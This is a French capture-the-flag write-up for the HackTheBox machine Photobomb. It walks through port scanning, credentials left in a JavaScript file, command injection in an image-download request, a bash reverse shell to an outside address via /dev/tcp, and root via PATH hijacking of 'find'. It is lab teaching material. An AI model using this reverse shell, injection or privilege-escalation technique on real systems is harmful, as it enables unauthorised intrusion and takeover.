<h1 align="center">
  WriteUp de la box Photobomb
  <br>
</h1> 

Bonjour à toutes et tous, aujourd'hui on s'attaque à la machine Photobomb sur HackTheBox. 

C'est une machine classifiée facile, et nous allons voir que les démarches pour atteindre les deux flags sont relativement rapides (si l'on cherche aux bons endroits).

## Enumération

On commence par réaliser un NMAP afin de scanner les ports ouverts sur la machine : 

![image](https://user-images.githubusercontent.com/33124690/195099486-b77ad55d-e35f-4a74-bfea-d0e4a677d81e.png)

On s'aperçoit que seul le port 80 (HTTP) ainsi que le port 22 (SSH) sont ouverts. On obtient aussi le nom de domaine (photobomb.htb) qu'il faut ajouter dans notre ficher "/etc/hosts"

Lorsque l'on se rend sur le site, on se rend compte qu'il n'y a pas grand chose, c'est un site vitrine (d'apparence). 

![image](https://user-images.githubusercontent.com/33124690/195100699-d756413d-d18f-4b08-9fb7-203ba7989aef.png)

Un lien permet de se connecter pour accéder à une autre partie du site. Néanmoins, sans creds, impossible de se connecter, il va falloir trouver une solution. On peut quand même remarquer qu'en cas d'échec d'authentification, on est redirigé sur "/printers".

![image](https://user-images.githubusercontent.com/33124690/195103675-392f6fa7-ed1d-4be0-9de6-2e5de3c0514c.png)

On lance une énumération des "directories" avec gobuster en fond, en parralèle, on continue l'énumération à la main afin de voir si l'on peut trouver quelque chose d'intéressant.

![image](https://user-images.githubusercontent.com/33124690/195105567-1f95810a-096e-415f-9be4-2d3d1354bc33.png)

## Accès au "/printers"

Les résultats de gobuster ne seront pas très intéressants car toutes les pages que l'on trouve nécessite une authentification. Toujours étant qu'en inspectant le code source de la page, on s'aperçoit qu'un fichier JS est utilisé. En y accédant, on obtient des creds visiblement destinés au support technique du site web.

![image](https://user-images.githubusercontent.com/33124690/195106155-64a3d6f0-0ce7-4f7f-aa11-d58bd4662bd9.png)

Il suffit d'utiliser ces creds pour nous connecter ou tout simplement de c/v le lien ! :)

## Reverse Shell pour accéder à la machine

Maintenant que nous avons accès, nous pouvons continuer à énumérer le site. On remarque rapidement un bouton pour télécharger la photo : 

![image](https://user-images.githubusercontent.com/33124690/195107724-663aaefb-0c04-450d-b35c-cfd1a48ce5ee.png)

On lance Burp Suite afin d'étudier la requête qui est effectuée. 

![image](https://user-images.githubusercontent.com/33124690/195108047-908809d1-3394-4012-a25f-12703ab17c57.png)

On test plusieurs attaques comme du LFI sur la requète, rien ne fonctionne jusqu'au moment où on test les injections de commandes.
Comme on peut le voir ci-contre, il suffit d'ajouter "; {command}" à la suite d'un des trois paramètres pour que ce soit executé. 

![image](https://user-images.githubusercontent.com/33124690/195109920-3df43674-442e-49df-9c53-8e26194183dc.png)

Maintenant que nous avons une RCE sur le serveur web, il suffit de créer notre reverse shell et de l'envoyer afin d'avoir accès à la machine.

Dans un premier temps, un simple reverse shell "bash -i >& /dev/tcp/10.10.14.40/4242 0>&1" ne fonctionne pas, même en URL encodant (surement à cause des caractères spéciaux). On décide donc de le passer en base64 en faisant attention de n'avoir aucun "+".

![image](https://user-images.githubusercontent.com/33124690/195110748-47ec7bde-8672-4391-9993-daeaa0c8312a.png)

Puis, on passe notre payload dans la requète.

![image](https://user-images.githubusercontent.com/33124690/195113874-e1f8dc08-c42c-4b56-9e19-d572dd4d2e68.png)

Ainsi, on obtient un shell sur la machine pour récupérer le flag user.txt. On stabilise notre shell et on s'attaque au privesc !


## Escalation de privilège

On pourrait lancer Linpeas pour voir s'il y a des chemins de privesc rapide, mais simplement à l'aide d'un ```sudo -l``` on s'aperçoit que l'on peut lancer un script en temps que Root.

![image](https://user-images.githubusercontent.com/33124690/195114580-44b45d8f-1db3-4d1c-8b1b-0d7160f848ca.png)

```
bash

#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Le script en question présente une vulnerabilité. En effet, "find" n'est pas défini avec son chemin absolu, on va pouvoir en abuser pour obtenir un shell root.

On créer un fichier bash sous le nom de find dans "/tmp". Ce dernier va copier bash et lui attribuer le setuid Root.

![image](https://user-images.githubusercontent.com/33124690/195116301-aedbe85b-4dbb-4991-801b-fce196d24aa7.png)

On oublie pas de "chmod +x" notre script find.

Maintenant, il suffit de changer le path de notre utilisateur (an ajoutant "/tmp:") et de lancer le script :D

![image](https://user-images.githubusercontent.com/33124690/195118038-967f6460-a179-44ed-999c-cefa2f902c17.png)

Et voilà ! 

![image](https://user-images.githubusercontent.com/33124690/195118182-d7881c4d-72f9-4887-87a3-895ca1ef5b4a.png)

J'espère que ce premier WriteUp vous aura plus, j'en referai peut être à l'avenir.
